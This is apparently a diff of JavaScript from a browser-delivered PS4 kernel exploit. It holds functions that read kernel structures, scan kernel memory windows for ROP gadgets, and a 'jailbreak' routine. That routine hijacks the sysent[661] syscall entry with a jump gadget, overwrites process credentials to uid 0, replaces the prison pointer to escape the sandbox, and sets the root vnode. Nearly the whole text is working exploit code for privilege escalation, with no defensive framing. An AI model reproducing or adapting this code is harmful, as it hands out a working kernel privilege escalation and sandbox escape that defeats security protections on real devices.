-function dumpWindow(label, startAddr, windowBytes) {
-    mark(label + "-START", hex(startAddr) + "-len=0x" + windowBytes.toString(16));
-    var found = scanGadgetsInWindow(startAddr, windowBytes);
-    mark(label + "-DONE", "patterns-found=" + found);
-    renderGadgets();
-}
-
-/* ============================================================
- *  STRING SCANNER
- * ============================================================ */
-function scanStringsInWindow(startAddr, windowBytes, maxStrings) {
-    var hits = [];
-    try {
-        var buf = readBytes(startAddr, windowBytes);
-        var run = "";
-        var runStart = 0;
-        for (var i = 0; i < buf.length; i++) {
-            var b = buf[i];
-            if (b >= 0x20 && b <= 0x7e) {
-                if (run.length === 0) runStart = i;
-                run += String.fromCharCode(b);
-            } else {
-                if (run.length >= 6) {
-                    hits.push({
-                        addr: hex(BigInt(startAddr) + BigInt(runStart)),
-                        text: run
-                    });
-                    if (hits.length >= (maxStrings || 40)) return hits;
-                }
-                run = "";
-            }
-        }
-        if (run.length >= 6 && hits.length < (maxStrings || 40)) {
-            hits.push({ addr: hex(BigInt(startAddr) + BigInt(runStart)), text: run });
-        }
-    } catch (err) { /* ignore */ }
     return hits;
 }
 
-/* ============================================================
- *  DEEP PROBE
- * ============================================================ */
-var PROBE_STRINGS = [];
-
-function probeKernelHeader(kbase) {
-    mark("PROBE-KERNEL-HEADER", hex(kbase));
-    setRow("kbase", "base", hex(kbase), "accent");
-    try {
-        var qs = [];
-        for (var off = 0; off < 0x40; off += 8) {
-            var v = read64(kbase + BigInt(off));
-            qs.push(v);
-            setRow("kbase", "q" + (off / 8), hex(v), "cyan");
-        }
-        mark("KBASE-HDR", qs.map(function(v){return hex(v);}).join(" "));
-    } catch (e) {
-        mark("KBASE-HDR-ERR", String(e && e.message).slice(0, 60));
+function dumpWindow(label, startAddr, windowBytes) {
+    mark(label + "-START", hex(startAddr) + "-len=0x" + windowBytes.toString(16));
+    var hits = scanGadgetsInWindow(startAddr, windowBytes);
+    if (hits.length === 0) {
+        mark(label + "-NONE", "no patterns matched");
+        return hits;
     }
-    setBadge("kbase", "OK", "ok");
-    setCardState("kbase", "ok");
-    setStat("kbase", hex(kbase), "accent");
+    for (var i = 0; i < hits.length; i++) {
+        mark("GADGET", hits[i].name + " @ " + hex(hits[i].addr) + " [" + label + "]");
+    }
+    return hits;
 }
 
-function probeStrings(kbase) {
-    mark("PROBE-STRINGS", "scanning kernel .text and .data windows");
-    var windows = [
-        { label: "early",   addr: kbase + 0x1000n,   len: 0x4000 },
-        { label: "text-2",  addr: kbase + 0x200000n, len: 0x4000 },
-        { label: "text-3",  addr: kbase + 0x400000n, len: 0x4000 },
-        { label: "data",    addr: kbase + 0xE00000n, len: 0x4000 }
-    ];
-    var all = [];
-    windows.forEach(function(w) {
-        var hits = scanStringsInWindow(w.addr, w.len, 30);
-        hits.forEach(function(h) {
-            // ignore junk: keep strings that look meaningful (letters + numbers)
-            if (h.text.length >= 8 && /[A-Za-z]/.test(h.text)) all.push(h);
-        });
-    });
-    // dedupe
-    var seen = {};
-    PROBE_STRINGS = [];
-    all.forEach(function(h) {
-        if (seen[h.text]) return;
-        seen[h.text] = 1;
-        PROBE_STRINGS.push(h);
-    });
-    renderStrings(PROBE_STRINGS);
-    mark("STRINGS-FOUND", "count=" + PROBE_STRINGS.length);
-    if (PROBE_STRINGS.length > 0) {
-        setBadge("strings", PROBE_STRINGS.length + " FOUND", "ok");
-        setCardState("strings", "ok");
-    } else {
-        setBadge("strings", "0", "warn");
-        setCardState("strings", "warn");
-    }
-}
-
-function probeProc0(kbase, evfOffset) {
-    mark("PROBE-PROC0", "evf=" + hex(kbase + BigInt(evfOffset)));
-    var evfAddr = kbase + BigInt(evfOffset);
-    var proc0 = read64(evfAddr);
-    setRow("proc0", "addr", hex(evfAddr), "cyan");
-    if (!plausibleKptr(proc0)) {
-        setBadge("proc0", "INVALID", "bad");
-        setCardState("proc0", "bad");
-        mark("PROC0-INVALID", "proc0=" + hex(proc0));
-        return 0n;
-    }
-    mark("PROC0-PTR", hex(proc0));
-
-    // Dump the first 0x400 bytes and look for structure by scanning known offsets.
-    // Offsets are educated guesses that match typical PS4/FreeBSD layouts.
-    var p_pid   = read64(proc0 + 0xBCn);
-    var p_ppid  = read64(proc0 + 0xC0n);
-    var p_pgid  = read64(proc0 + 0xC4n);
-    var p_flag  = read64(proc0 + 0xB8n);
-    var p_ucred = read64(proc0 + 0x40n);
-    var p_fd    = read64(proc0 + 0x48n);
-    var p_vm    = read64(proc0 + 0x50n);
-    var p_thr   = read64(proc0 + 0x10n);
-
-    // p_comm is usually near the end of the proc struct. Try a few offsets.
-    var comm = "";
-    var commAddr = proc0 + 0x1A0n;
-    comm = readCString(commAddr, 32);
-    if (!comm || !/^[\x20-\x7e]+$/.test(comm) || comm.length < 2) {
-        commAddr = proc0 + 0x2D0n;
-        comm = readCString(commAddr, 32);
-    }
-
-    setRow("proc0", "pid",   p_pid.toString(), "cyan");
-    setRow("proc0", "ppid",  p_ppid.toString());
-    setRow("proc0", "pgid",  p_pgid.toString());
-    setRow("proc0", "flag",  hex(p_flag));
-    setRow("proc0", "ucred", hex(p_ucred), "purple");
-    setRow("proc0", "fd",    hex(p_fd));
-    setRow("proc0", "vmspace", hex(p_vm));
-    setRow("proc0", "threads", hex(p_thr));
-    setRow("proc0", "comm",  comm || "(no printable name)");
-
-    setBadge("proc0", "OK", "ok");
-    setCardState("proc0", "ok");
-    setStat("proc0", hex(proc0), "ok");
-    mark("PROC0-FIELDS", "pid=" + p_pid + " ucred=" + hex(p_ucred) + " fd=" + hex(p_fd) + " vm=" + hex(p_vm));
-    return proc0;
-}
-
-function probeUcred(proc0) {
-    var ucred = read64(proc0 + 0x40n);
-    if (!plausibleKptr(ucred)) {
-        setBadge("ucred", "NO UCRED", "warn");
-        setCardState("ucred", "warn");
-        mark("UCRED-INVALID", "ptr=" + hex(ucred));
-        return 0n;
-    }
-    var uid     = read64(ucred + 0x04n);
-    var ruid    = read64(ucred + 0x08n);
-    var svuid   = read64(ucred + 0x0Cn);
-    var gid     = read64(ucred + 0x10n);
-    var rgid    = read64(ucred + 0x14n);
-    var svgid   = read64(ucred + 0x18n);
-    var ngroups = read64(ucred + 0x20n);
-    var prison  = read64(ucred + 0x30n);
-    // sce flags are often at +0x58 or +0x60 depending on FW
-    var sce = 0n;
-    try { sce = read64(ucred + 0x58n); } catch (_) {}
-
-    setRow("ucred", "addr",    hex(ucred), "purple");
-    setRow("ucred", "uid",     uid.toString(),   uid === 0n ? "ok" : "warn");
-    setRow("ucred", "ruid",    ruid.toString());
-    setRow("ucred", "svuid",   svuid.toString());
-    setRow("ucred", "gid",     gid.toString(),   gid === 0n ? "ok" : "warn");
-    setRow("ucred", "rgid",    rgid.toString());
-    setRow("ucred", "svgid",   svgid.toString());
-    setRow("ucred", "ngroups", ngroups.toString());
-    setRow("ucred", "prison",  hex(prison), "cyan");
-    setRow("ucred", "sce",     hex(sce));
-
-    setBadge("ucred", "OK", "ok");
-    setCardState("ucred", "ok");
-    setStat("uid", uid.toString() + "/" + gid.toString(), uid === 0n ? "ok" : "warn");
-    mark("UCRED-FIELDS", "uid=" + uid + " gid=" + gid + " prison=" + hex(prison));
-    return ucred;
-}
-
-function probePrison0(kbase, prisonOffset) {
-    var addr = kbase + BigInt(prisonOffset);
-    var val  = read64(addr);
-    setRow("prison", "addr",  hex(addr), "cyan");
-    setRow("prison", "value", hex(val),  "purple");
-
-    if (plausibleKptr(val)) {
-        try {
-            var refs = read64(val + 0x04n);
-            setRow("prison", "refs", refs.toString());
-            // pr_name is usually a char array inside the struct
-            var name = readCString(val + 0x18n, 32);
-            if (!name || !/^[\x20-\x7e]+$/.test(name)) name = "(no printable name)";
-            setRow("prison", "name", name);
-        } catch (_) {}
-    }
-    setBadge("prison", "OK", "ok");
-    setCardState("prison", "ok");
-    mark("PRISON0", "addr=" + hex(addr) + "-value=" + hex(val));
-}
-
-function probeRootvnode(kbase, rootOffset) {
-    var addr = kbase + BigInt(rootOffset);
-    var val  = read64(addr);
-    setRow("root", "addr",  hex(addr), "cyan");
-    setRow("root", "value", hex(val),  "purple");
-
-    if (plausibleKptr(val)) {
-        try {
-            var v_type = read64(val + 0x00n);
-            var v_mount = read64(val + 0x20n);
-            setRow("root", "type", hex(v_type));
-            setRow("root", "vfs",  hex(v_mount));
-            // v_path may be a pointer or inline string depending on FW
-            try {
-                var pathPtr = read64(val + 0x80n);
-                if (plausibleKptr(pathPtr)) {
-                    var p = readCString(pathPtr, 48);
-                    if (p && /^[\x20-\x7e]+$/.test(p)) setRow("root", "path", p, "ok");
-                }
-            } catch (_) {}
-        } catch (_) {}
-    }
-    setBadge("root", "OK", "ok");
-    setCardState("root", "ok");
-    mark("ROOTVNODE", "addr=" + hex(addr) + "-value=" + hex(val));
-}
-
-function probeSysent(kbase, sysentOffset, jmpOffset) {
-    var entryAddr = kbase + BigInt(sysentOffset);
-    var jmpAddr   = kbase + BigInt(jmpOffset);
-
-    var sy_narg   = read64(entryAddr);
-    var sy_call   = read64(entryAddr + 8n);
-    var sy_thrcnt = read64(entryAddr + 0x2Cn);
-    var jmpBytes  = read64(jmpAddr);
-
-    setRow("sysent", "addr",   hex(entryAddr), "cyan");
-    setRow("sysent", "narg",   hex(sy_narg));
-    setRow("sysent", "call",   hex(sy_call), "purple");
-    setRow("sysent", "thrcnt", hex(sy_thrcnt));
-    setRow("sysent", "jmp",    hex(jmpAddr) + "  /  " + hex(jmpBytes), "cyan");
-
-    // Try to find the table base: if entries are 0x30 bytes, base = entry - 661*0x30.
-    var ENTRY_SIZE = 0x30;
-    var TABLE_BASE = entryAddr - BigInt(661 * ENTRY_SIZE);
-    setRow("sysent", "tbase", hex(TABLE_BASE));
-
-    // Dump first entry
-    try {
-        var s0_narg = read64(TABLE_BASE);
-        var s0_call = read64(TABLE_BASE + 8n);
-        setRow("sysent", "entry0", "narg=" + hex(s0_narg) + " call=" + hex(s0_call));
-    } catch (_) {}
-
-    // Dump a range of entries (skip entries whose call pointer isn't plausible)
-    var entriesRead = 0;
-    var sampleCalls = [];
-    for (var i = 1; i <= 20; i++) {
-        try {
-            var eAddr = entryAddr + BigInt(i * ENTRY_SIZE);
-            var call = read64(eAddr + 8n);
-            if (plausibleKptr(call)) {
-                entriesRead++;
-                if (sampleCalls.length < 5) sampleCalls.push("[" + (661 + i) + "]=" + hex(call));
-            }
-        } catch (_) {}
-    }
-    setRow("sysent", "count", entriesRead + " plausible");
-    mark("SYSENT-661", hex(entryAddr));
-    mark("SYSENT-661-CALL", hex(sy_call));
-    mark("SYSENT-SAMPLE", sampleCalls.join(" "));
-    setBadge("sysent", "OK", "ok");
-    setCardState("sysent", "ok");
-    setStat("sysent", hex(entryAddr), "ok");
-    return { entryAddr: entryAddr, jmpAddr: jmpAddr, call: sy_call };
-}
-
-function probeFiledesc(proc0) {
-    var p_fd = read64(proc0 + 0x48n);
-    setRow("filedesc", "pfd", hex(p_fd), "cyan");
-    if (!plausibleKptr(p_fd)) {
-        setBadge("filedesc", "N/A", "warn");
-        setCardState("filedesc", "warn");
-        return;
-    }
-    // struct filedesc { struct file **fd_ofiles; ... }
-    try {
-        var ofiles = read64(p_fd + 0x00n);
-        setRow("filedesc", "fdt", hex(ofiles), "purple");
-
-        // fd_nfiles is usually near the start
-        var nfiles = read64(p_fd + 0x28n);
-        if (nfiles > 0x1000n) nfiles = read64(p_fd + 0x18n);
-        setRow("filedesc", "nfds", nfiles.toString());
-
-        // cdir / rdir / jdir are vnode pointers inside filedesc
-        var cdir = read64(p_fd + 0x50n);
-        var rdir = read64(p_fd + 0x58n);
-        var jdir = read64(p_fd + 0x60n);
-        if (plausibleKptr(cdir)) setRow("filedesc", "cd",  hex(cdir), "cyan");
-        if (plausibleKptr(rdir)) setRow("filedesc", "rd",  hex(rdir), "cyan");
-        if (plausibleKptr(jdir)) setRow("filedesc", "jdir", hex(jdir), "cyan");
-    } catch (_) {}
-    setBadge("filedesc", "OK", "ok");
-    setCardState("filedesc", "ok");
-    mark("FILEDESC", "p_fd=" + hex(p_fd));
-}
-
-function probeVmspace(proc0) {
-    var vm = read64(proc0 + 0x50n);
-    setRow("vm", "vm", hex(vm), "cyan");
-    if (!plausibleKptr(vm)) {
-        setBadge("vm", "N/A", "warn");
-        setCardState("vm", "warn");
-        return;
-    }
-    // struct vmspace { struct vm_map vm_map; struct pmap vm_pmap; ... }
-    try {
-        var map = read64(vm + 0x00n);
-        var pmap = read64(vm + 0x30n);
-        if (plausibleKptr(map))  setRow("vm", "map",  hex(map), "purple");
-        if (plausibleKptr(pmap)) setRow("vm", "pmap", hex(pmap), "purple");
-
-        // vm_map base/top are inside the map struct
-        if (plausibleKptr(map)) {
-            var base = read64(map + 0x10n);
-            var top  = read64(map + 0x18n);
-            setRow("vm", "base", hex(base));
-            setRow("vm", "top",  hex(top));
-        }
-    } catch (_) {}
-    setBadge("vm", "OK", "ok");
-    setCardState("vm", "ok");
-    mark("VMSPACE", "vm=" + hex(vm));
-}
-
-function probeGadgets(kbase, sysentInfo, rootAddr, prisonAddr, proc0) {
-    mark("PROBE-GADGETS", "expanded scan across kernel windows");
-
-    // Window 1: around sy_call pointer (kernel function body)
-    var w1Base = (sysentInfo.call & ~0xFFFn) - 0x1000n;
-    if (w1Base < kbase) w1Base = kbase;
-    dumpWindow("SCAN-SYCALL", w1Base, 0x4000);
-
-    // Window 2: early kernel text
-    dumpWindow("SCAN-EARLY", kbase + 0x1000n, 0x4000);
-
-    // Window 3: around the known jmp gadget
-    dumpWindow("SCAN-JMP", (sysentInfo.jmpAddr & ~0xFFn), 0x800);
-
-    // Window 4: around rootvnode
-    dumpWindow("SCAN-ROOT", (rootAddr & ~0xFFFn), 0x1000);
-
-    // Window 5: around prison0
-    dumpWindow("SCAN-PRISON", (prisonAddr & ~0xFFFn), 0x1000);
-
-    // Window 6: around proc0
-    if (plausibleKptr(proc0)) {
-        dumpWindow("SCAN-PROC0", (proc0 & ~0xFFFn), 0x1000);
-    }
-
-    // Function-prologue density: count "push rbp; mov rbp, rsp" (55 48 89 e5)
-    var prologues = 0;
-    try {
-        var buf = readBytes(kbase + 0x1000n, 0x8000);
-        var pat = [0x55, 0x48, 0x89, 0xE5];
-        for (var i = 0; i <= buf.length - 4; i++) {
-            if (buf[i] === pat[0] && buf[i+1] === pat[1] && buf[i+2] === pat[2] && buf[i+3] === pat[3]) prologues++;
-        }
-    } catch (_) {}
-    mark("SYMBOL-DENSITY", "prologues-in-0x8000=" + prologues);
-}
-
+// ========== KERNEL PROBE (default post-R/W action) ==========
 function runProbe() {
     mark("===== KERNEL PROBE START =====", "fw=" + FW_LABEL + " rev=" + REVISION);
 
     try {
+        // Fixed mapping on PS4; used as base for all offset-based reads.
         var kbase = 0xffffffff80000000n;
         mark("KBASE-ASSUMED", hex(kbase));
+
+        // Sanity-check the base — grab the first 32 bytes.
+        try {
+            var hdrA = read64(kbase);
+            var hdrB = read64(kbase + 8n);
+            var hdrC = read64(kbase + 16n);
+            var hdrD = read64(kbase + 24n);
+            mark("KBASE-HDR", "q0=" + hex(hdrA) + " q1=" + hex(hdrB) + " q2=" + hex(hdrC) + " q3=" + hex(hdrD));
+        } catch (_) {}
 
         var evf       = fwOffsets.evf;
         var prison0   = fwOffsets.prison0;
@@ -2145,100 +1272,235 @@ function runProbe() {
         var sysent    = fwOffsets.sysent;
         var jmp       = fwOffsets.jmp;
 
-        // Phase 1: kernel header
-        probeKernelHeader(kbase);
+        // -------- EVF / proc0 --------
+        var evfAddr = kbase + BigInt(evf);
+        var evfVal  = read64(evfAddr);
+        mark("EVF", "addr=" + hex(evfAddr) + "-proc0=" + hex(evfVal));
 
-        // Phase 2: strings
-        probeStrings(kbase);
-
-        // Phase 3: core structures
-        var proc0 = probeProc0(kbase, evf);
+        // -------- prison0 --------
         var prisonAddr = kbase + BigInt(prison0);
-        probePrison0(kbase, prison0);
-        var rootAddr = kbase + BigInt(rootvnode);
-        probeRootvnode(kbase, rootvnode);
+        var prisonVal  = read64(prisonAddr);
+        mark("PRISON0", "addr=" + hex(prisonAddr) + "-value=" + hex(prisonVal));
 
-        // Phase 4: credentials
-        if (plausibleKptr(proc0)) {
-            probeUcred(proc0);
-            probeFiledesc(proc0);
-            probeVmspace(proc0);
+        // -------- rootvnode --------
+        var rootAddr = kbase + BigInt(rootvnode);
+        var rootVal  = read64(rootAddr);
+        mark("ROOTVNODE", "addr=" + hex(rootAddr) + "-value=" + hex(rootVal));
+
+        // -------- sysent[661] (getpid-style hijack slot) --------
+        var sysentAddr = kbase + BigInt(sysent);
+        var sy_narg    = read64(sysentAddr);
+        var sy_call    = read64(sysentAddr + 8n);
+        var sy_thrcnt  = read64(sysentAddr + 0x2Cn);
+        mark("SYSENT-661", "addr=" + hex(sysentAddr));
+        mark("SYSENT-661-NARG", hex(sy_narg));
+        mark("SYSENT-661-CALL", hex(sy_call));
+        mark("SYSENT-661-THRCNT", hex(sy_thrcnt));
+
+        // -------- the exact jmp-gadget used by the classic jailbreak --------
+        var jmpAddr  = kbase + BigInt(jmp);
+        var jmpBytes = read64(jmpAddr);
+        mark("JMP-RSI-KNOWN", "addr=" + hex(jmpAddr) + "-bytes=" + hex(jmpBytes));
+
+        // -------- Dump first 256 bytes of sysent --------
+        var dump = [];
+        for (var off = 0; off < 0x100; off += 0x20) {
+            var row = "+" + ("000" + off.toString(16)).slice(-3) + ":";
+            for (var q = 0; q < 0x20; q += 8) {
+                var v = read64(sysentAddr + BigInt(off + q));
+                var s = v.toString(16);
+                while (s.length < 16) s = "0" + s;
+                row += " " + s;
+            }
+            dump.push(row);
+        }
+        mark("SYSENT-DUMP", dump.join("\n"));
+
+        // -------- Follow proc0 pointer chain --------
+        if (evfVal > 0xffff000000000000n && evfVal < 0xffffffffffffffffn) {
+            try {
+                var pid   = read64(evfVal + 0xBCn);
+                var ucred = read64(evfVal + 0x40n);
+                mark("PROC0-PID",   hex(pid));
+                mark("PROC0-UCRED", hex(ucred));
+                if (ucred > 0xffff000000000000n && ucred < 0xffffffffffffffffn) {
+                    var uid    = read64(ucred + 0x04n);
+                    var gid    = read64(ucred + 0x08n);
+                    var prison = read64(ucred + 0x30n);
+                    mark("PROC0-UCRED-VALUES", "uid=" + hex(uid) + "-gid=" + hex(gid) + "-prison=" + hex(prison));
+                }
+            } catch (e) {
+                mark("PROC0-CHAIN-ERR", String(e && e.message).slice(0, 60));
+            }
         }
 
-        // Phase 5: sysent
-        var sysentInfo = probeSysent(kbase, sysent, jmp);
+        // -------- Gadget / ROP scans --------
+        // Window 1: around the sy_call pointer (real kernel function body)
+        var w1Base = (sy_call & ~0xFFFn) - 0x800n;
+        if (w1Base < kbase) w1Base = kbase;
+        dumpWindow("SCAN-SYCALL", w1Base, 0x1000);
 
-        // Phase 6: gadgets
-        probeGadgets(kbase, sysentInfo, rootAddr, prisonAddr, proc0);
+        // Window 2: early kernel text
+        dumpWindow("SCAN-EARLY", kbase + 0x1000n, 0x1000);
 
-        // Summary
+        // Window 3: tight window around the known jmp gadget
+        dumpWindow("SCAN-JMP", (jmpAddr & ~0xFFn), 0x400);
+
+        // Window 4: around rootvnode table
+        dumpWindow("SCAN-ROOT", (rootAddr & ~0xFFFn), 0x800);
+
+        // -------- Report the ROP-relevant findings in a summary --------
         mark("ROP-SUMMARY",
             "kb=" + hex(kbase) +
-            " sysent=" + hex(sysentInfo.entryAddr) +
-            " jmp=" + hex(sysentInfo.jmpAddr) +
-            " prison0=" + hex(prisonAddr) +
-            " rootvnode=" + hex(rootAddr));
+            "-sysent=" + hex(sysentAddr) +
+            "-jmp=" + hex(jmpAddr) +
+            "-prison0=" + hex(prisonVal) +
+            "-rootvnode=" + hex(rootVal));
 
         mark("===== KERNEL PROBE COMPLETE =====", "fw=" + FW_LABEL);
-        setStatus("halted", "PROBE COMPLETE", "all reachable structures dumped");
+        setStatus("halted", "R/W PROBE COMPLETE", "gadgets + kernel info in console");
+        maybeAutoSave();
 
     } catch (err) {
         mark("PROBE-ERROR", (err && err.name) + ":" + String(err && err.message).slice(0, 120));
     }
 }
 
-/* ============================================================
- *  PS4 JAILBREAK (opt-in via ?jb=1)
- * ============================================================ */
+// ========== PS4 JAILBREAK (opt-in via ?jb=1) ==========
 function runJailbreak() {
     mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);
+
     try {
+        var evf = fwOffsets.evf;
+        var prison0 = fwOffsets.prison0;
+        var rootvnode = fwOffsets.rootvnode;
+        var sysent = fwOffsets.sysent;
+        var jmp = fwOffsets.jmp;
+
         var kbase = 0xffffffff80000000n;
-        var sysent_661 = kbase + BigInt(fwOffsets.sysent);
-        var jmp_rsi = kbase + BigInt(fwOffsets.jmp);
+        mark("KERNEL-BASE", hex(kbase));
+
+        var sysent_661 = kbase + BigInt(sysent);
+        var jmp_rsi = kbase + BigInt(jmp);
+        mark("SYSENT-661", hex(sysent_661));
+        mark("JMP-RSI", hex(jmp_rsi));
+
         var sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
         var sy_call = read64(sysent_661 + 8n);
         var sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);
+
         write64(sysent_661, 2n);
         write64(sysent_661 + 8n, jmp_rsi);
         write64(sysent_661 + 0x2Cn, 1n);
         mark("SYSENT-HIJACKED", "success");
-        var proc = kbase + BigInt(fwOffsets.evf);
-        var prisonVal = read64(kbase + BigInt(fwOffsets.prison0));
+
+        var proc = kbase + BigInt(evf);
         var sandboxEscaped = false;
+        var verifyUid = -1n;
+        var verifyGid = -1n;
+        var verifyPrison = -1n;
+        var dbgMode = Q.get("dbg") === "1";
+
+        function patchAndVerifyUcred(ucred, prisonVal) {
+            write64(ucred + 0x04n, 0n);
+            write64(ucred + 0x08n, 0n);
+            write64(ucred + 0x0Cn, 0n);
+            write64(ucred + 0x10n, 1n);
+            write64(ucred + 0x30n, prisonVal);
+            verifyUid = read64(ucred + 0x04n);
+            verifyGid = read64(ucred + 0x08n);
+            verifyPrison = read64(ucred + 0x30n);
+            return verifyUid === 0n && verifyGid === 0n && verifyPrison === prisonVal;
+        }
+
+        var prisonVal = read64(kbase + BigInt(prison0));
+        var hits = 0;
         for (var i = 0; i < 0x4000; i += 8) {
             try {
-                var c = read64(proc + BigInt(i));
-                if ((c & 0xFFFFFFFFn) === 0x726f7272n) {
+                var candidate = read64(proc + BigInt(i));
+                if ((candidate & 0xFFFFFFFFn) === 0x726f7272n) {
+                    hits++;
                     var ucred = read64(proc + BigInt(i - 0x40));
-                    if (plausibleKptr(ucred)) {
-                        write64(ucred + 0x04n, 0n);
-                        write64(ucred + 0x08n, 0n);
-                        write64(ucred + 0x0Cn, 0n);
-                        write64(ucred + 0x10n, 1n);
-                        write64(ucred + 0x30n, prisonVal);
-                        if (read64(ucred + 0x04n) === 0n) {
+                    if (ucred > 0n && ucred < 0xffffffffffffn) {
+                        if (dbgMode) mark("SCAN-HIT", "marker-off=0x" + i.toString(16) + "-ucred=" + hex(ucred));
+                        if (patchAndVerifyUcred(ucred, prisonVal)) {
                             sandboxEscaped = true;
                             mark("SANDBOX-ESCAPE", "success");
+                            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
                         }
                         break;
                     }
                 }
-            } catch (_) {}
+            } catch(e) {}
         }
+        if (!sandboxEscaped && hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");
+
+        if (!sandboxEscaped) {
+            var sigStart = proc - 0x4000n;
+            var sigEnd = proc + 0x4000n;
+            var sigFound = 0n;
+            for (var s = sigStart; s < sigEnd && !sandboxEscaped; s += 8n) {
+                try {
+                    var ref = Number(read64(s) & 0xFFFFFFFFn);
+                    if (ref < 1 || ref > 0x200) continue;
+                    var ngroups = Number(read64(s + 0x10n) & 0xFFFFFFFFn);
+                    if (ngroups < 1 || ngroups > 0x80) continue;
+                    var pr = read64(s + 0x30n);
+                    if (pr !== prisonVal) continue;
+                    if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(s) + "-ref=" + ref + "-groups=" + ngroups);
+                    if (patchAndVerifyUcred(s, prisonVal)) {
+                        sandboxEscaped = true;
+                        sigFound = s;
+                        mark("UCRED-SIG-FOUND", hex(s));
+                        mark("SANDBOX-ESCAPE", "success");
+                        mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
+                    }
+                } catch(e) {}
+            }
+            if (!sandboxEscaped) {
+                mark("SANDBOX-ESCAPE", "FAILED-not-found");
+                if (dbgMode) {
+                    var dump = "";
+                    for (var d = 0; d < 0x100; d += 16) {
+                        var ln = hex(proc + BigInt(d)) + ": ";
+                        for (var c = 0; c < 16; c++) {
+                            var b = Number(read64(proc + BigInt(d + c)) & 0xFFn);
+                            ln += (b < 16 ? "0" : "") + b.toString(16);
+                        }
+                        dump += ln + "\n";
+                    }
+                    mark("PROC-DUMP", dump.trim());
+                }
+            }
+        }
+
+        var root = read64(kbase + BigInt(rootvnode));
+        var rootVerified = false;
+        if (root > 0n && root < 0xffffffffffffn) {
+            var fd = read64(proc + BigInt(0x48));
+            write64(fd + 0x10n, root);
+            write64(fd + 0x18n, root);
+            var fdCheck = read64(fd + 0x10n);
+            rootVerified = fdCheck === root;
+            mark("ROOT-VNODE-SET", rootVerified ? "success" : "mismatch");
+            mark("VERIFY-ROOTVNODE", "fd=" + hex(fd) + "-readback=" + (fdCheck === root));
+        } else {
+            mark("ROOT-VNODE-SET", "FAILED-invalid-root");
+        }
+
         write64(sysent_661, BigInt(sy_narg));
         write64(sysent_661 + 8n, sy_call);
         write64(sysent_661 + 0x2Cn, BigInt(sy_thrcnt));
         mark("SYSENT-RESTORED", "success");
-        mark("===== JAILBREAK COMPLETE =====", "root=" + sandboxEscaped);
+
+        mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " root=" + sandboxEscaped + "-fs=" + rootVerified);
+
     } catch (error) {
         mark("JAILBREAK-ERROR", error.message);
     }
 }
 
-/* ============================================================
- *  BOOT
- * ============================================================ */
+// ========== SINGLE-SHOT ENTRY ==========
 var attemptSucceeded = false;
 
 function runAttempt() {
@@ -2252,32 +1514,10 @@ function runAttempt() {
     }
 }
 
-buildDashboard();
-
 try {
     document.getElementById("toolbarMeta").textContent =
         "rev " + REVISION + " · fw " + (FW_LABEL || "?") + " · post " + (RUN_JAILBREAK ? "JB" : "PROBE");
 } catch (_) {}
-
-(function seedFirmwareCard() {
-    setRow("fw", "label", FW_LABEL || "(undetected)", FW_LABEL ? "ok" : "warn");
-    setRow("fw", "ua",    navigator.userAgent);
-    setRow("fw", "rev",   REVISION);
-    if (FW_LABEL && fwOffsets) {
-        setRow("fw", "off-evf",     "0x" + fwOffsets.evf.toString(16), "cyan");
-        setRow("fw", "off-prison0", "0x" + fwOffsets.prison0.toString(16), "cyan");
-        setRow("fw", "off-root",    "0x" + fwOffsets.rootvnode.toString(16), "cyan");
-        setRow("fw", "off-sysent",  "0x" + fwOffsets.sysent.toString(16), "cyan");
-        setRow("fw", "off-jmp",     "0x" + fwOffsets.jmp.toString(16), "cyan");
-        setBadge("fw", "OK", "ok");
-        setCardState("fw", "ok");
-        setStat("fw", FW_LABEL, "ok");
-    } else {
-        setBadge("fw", "UNKNOWN", "warn");
-        setCardState("fw", "warn");
-        setStat("fw", "unknown", "warn");
-    }
-})();
 
 runAttempt();
 </script>
